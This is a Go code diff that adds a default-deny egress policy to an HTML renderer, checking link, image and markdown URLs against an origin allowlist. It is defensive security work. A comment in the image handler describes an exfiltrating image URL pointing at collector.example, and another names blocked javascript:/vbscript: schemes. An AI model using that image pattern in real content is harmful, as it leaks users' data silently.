@@ -102,11 +102,45 @@ func collectFragments(node wire.Node, acc map[string]wire.Node) {
 }
 
 // renderer holds the per-render context: host binding sources, the fragment
-// registry, and the island markers (empty on a plain render).
+// registry, the island markers (empty on a plain render), and the ambient
+// destination policy.
 type renderer struct {
 	sources   BindingSources
 	fragments map[string]wire.Node
 	islands   map[string]string // node id → island id
+	// egress is the AMBIENT destination policy (WIRE_FORMAT.md §14.1) every URL
+	// this render emits is checked against — the Link href, the Image src, and
+	// the markdown body's links and images.
+	//
+	// THE DEFAULT AT EVERY CONVENIENCE ENTRY POINT IS DenyNonLocalEgress: a
+	// decoded tree is untrusted input, an emission cannot declare its own
+	// egress, so absent a host's declaration it gets none. PermissiveEgress is
+	// reached BY NAME (RenderHTMLWithEgress / RenderWithIslandsAndEgress), so a
+	// grep for `permissive` finds every host that has widened it, in that
+	// host's own source rather than inherited silently.
+	//
+	// It is a FIELD on the per-render context rather than a package-level
+	// variable because a mutable global is non-reentrant under concurrent
+	// server renders, which is the one thing a headless host does all the time.
+	// A zero renderer therefore denies non-local egress by construction (the
+	// zero EgressPolicy allows nothing at all, not even local), so a
+	// construction site that forgets to name a policy fails closed.
+	egress EgressPolicy
+}
+
+// egressAttrPairs adapts the exported seam's (name, value) pairs to this
+// package's internal attribute type. Emitted LAST on the element so the diff
+// against the pre-policy bytes is a pure suffix — every attribute that was
+// there is still where it was.
+func egressAttrPairs(pairs [][2]string) []attr {
+	if len(pairs) == 0 {
+		return nil
+	}
+	out := make([]attr, 0, len(pairs))
+	for _, p := range pairs {
+		out = append(out, attr{p[0], p[1]})
+	}
+	return out
 }
 
 func (r *renderer) text(ts wire.Value) string {
@@ -630,8 +664,14 @@ func (r *renderer) heading(fields map[string]wire.Value) string {
 	return textElement("h"+strconv.Itoa(level), []attr{{"class", "fuaran-heading" + suffix}}, r.text(fields["text"]))
 }
 
+// markdown renders the body through the POLICY-TAKING markdown entry point, so
+// every link and image destination the body names is checked against the
+// render's ambient policy. The pure MarkdownToHTML is the permissive case and
+// is no longer reachable from a node render — a decoded markdown body is the
+// easiest place in the whole tree to hide an exfiltrating image.
 func (r *renderer) markdown(fields map[string]wire.Value) string {
-	return element("div", []attr{{"class", "fuaran-markdown"}}, MarkdownToHTML(r.text(fields["text"])))
+	return element("div", []attr{{"class", "fuaran-markdown"}},
+		MarkdownToHTMLWithEgress(r.egress, r.text(fields["text"])))
 }
 
 func (r *renderer) metric(node wire.Node, fields map[string]wire.Value) string {
@@ -794,7 +834,21 @@ func (r *renderer) link(fields map[string]wire.Value, semanticAttrs []attr) stri
 	if h, ok := resolveBinding(fields["href"], r.sources).(wire.Str); ok {
 		href = string(h)
 	}
-	safeHref := SanitizeURLOrBlank(href)
+	// The href passes through the ambient destination policy: the scheme floor
+	// blocks javascript:/vbscript:/raw data:, and the origin allowlist then
+	// decides whether this tree may point at that host AT ALL. A refused href
+	// renders as about:blank#fuaran-egress-refused carrying the class + host,
+	// so the refusal is visible in the document rather than only in the logs.
+	//
+	// EgressHyperlink is deliberately the class even when `download` is set:
+	// the class names the SINK the browser reaches, and a download anchor is
+	// still a hyperlink the user must act on. Scoping it separately would let a
+	// policy that denied hyperlinks admit the same destination by flipping one
+	// boolean on the tree.
+	safeHref, egressPairs := r.egress.SanitizeURLForEgress(EgressHyperlink, href)
+	// A refused mailto: never reaches the protected arm — safeHref is the
+	// refusal URL by then, so the prefix test fails and the ordinary anchor
+	// below carries the marker. That ordering is the reference host's.
 	if p, ok := fields["protection"].(wire.Str); ok && string(p) == "email" && strings.HasPrefix(safeHref, "mailto:") {
 		// Phase 812 — protected email link. Every UTF-16 code unit of the
 		// sanitised href AND the label is emitted as a decimal HTML entity: the
@@ -823,6 +877,10 @@ func (r *renderer) link(fields map[string]wire.Value, semanticAttrs []attr) stri
 	}
 	// The node's a11y projection lands on the anchor.
 	attrs = append(attrs, semanticAttrs...)
+	// The refusal marker rides the element that carries the refused href, so a
+	// reader of the DOM sees WHY this anchor points at about:blank. Empty on an
+	// allow.
+	attrs = append(attrs, egressAttrPairs(egressPairs)...)
 	return textElement("a", attrs, r.text(fields["label"]))
 }
 
@@ -840,10 +898,18 @@ func (r *renderer) image(fields map[string]wire.Value, semanticAttrs []attr) str
 			cls = "fuaran-image fuaran-image-rounded"
 		}
 	}
+	// `src` is the Media class, and it is the one that matters most: the
+	// browser fetches it with NO user act, so RENDERING the tree IS the
+	// request. https://collector.example/?s=<bound state> passes every scheme
+	// check — allowlisted scheme, well-formed host, no script anywhere — and
+	// exfiltrates on sight. Only the origin allowlist closes it, which is why
+	// the ambient default denies rather than waiting to be asked.
+	safeSrc, egressPairs := r.egress.SanitizeURLForEgress(EgressMedia, src)
 	// The a11y projection lands on the <img> itself.
-	return voidElement("img", append([]attr{
-		{"class", cls}, {"src", SanitizeURLOrBlank(src)}, {"alt", r.text(fields["alt"])},
-	}, semanticAttrs...))
+	attrs := append([]attr{
+		{"class", cls}, {"src", safeSrc}, {"alt", r.text(fields["alt"])},
+	}, semanticAttrs...)
+	return voidElement("img", append(attrs, egressAttrPairs(egressPairs)...))
 }
 
 func (r *renderer) list(fields map[string]wire.Value) string {
@@ -1299,9 +1365,38 @@ func (r *renderer) custom(fields map[string]wire.Value) string {
 // Sources is an optional host-supplied binding map (binding key → value) used
 // to resolve non-Static bindings; the headless baseline works with nil,
 // resolving Static bindings and placeholdering the rest.
+//
+// The destination policy is the ambient DenyNonLocalEgress (WIRE_FORMAT.md
+// §14.1): a decoded tree may point at its own origin and nowhere else, with
+// no caller opt-in required. A host that needs a wider posture reaches for
+// RenderHTMLWithEgress BY NAME.
 func RenderHTML(node wire.Node, sources BindingSources) string {
+	return RenderHTMLWithEgress(node, sources, DenyNonLocalEgress())
+}
+
+// RenderHTMLWithEgress is RenderHTML with an EXPLICIT destination policy — the
+// named opt-out from the ambient default-deny (WIRE_FORMAT.md §14.1).
+//
+// A separate entry point rather than an optional parameter, and named rather
+// than inferred, for the reason every posture inversion in this package is: a
+// grep for this function (or for `permissive`) finds every host that has
+// widened its egress, so the choice is visible in the host's own source instead
+// of inherited silently. Passing DenyNonLocalEgress here is exactly RenderHTML.
+//
+// Three postures a host reaches for, in descending order of how much they
+// should have to justify:
+//
+//   - renderer.DenyNonLocalEgress().AllowOrigin(renderer.HostSuffix("cdn.example"), renderer.EgressMedia)
+//     — the shape to prefer. Declares WHAT may be reached and FOR WHAT, and
+//     stays default-deny for everything else.
+//   - DenyNonLocalEgress() with AllowNonNetwork set — the narrowest fix for a
+//     surface whose only external destination is a mailto: / tel: link.
+//   - PermissiveEgress() — every destination, for a HAND-AUTHORED tree where
+//     the author is the trust boundary. Correct for a catalog or a sample;
+//     wrong for anything that renders a decoded tree.
+func RenderHTMLWithEgress(node wire.Node, sources BindingSources, policy EgressPolicy) string {
 	fragments := make(map[string]wire.Node)
 	collectFragments(node, fragments)
-	r := &renderer{sources: sources, fragments: fragments}
+	r := &renderer{sources: sources, fragments: fragments, egress: policy}
 	return r.renderNode(node)
 }
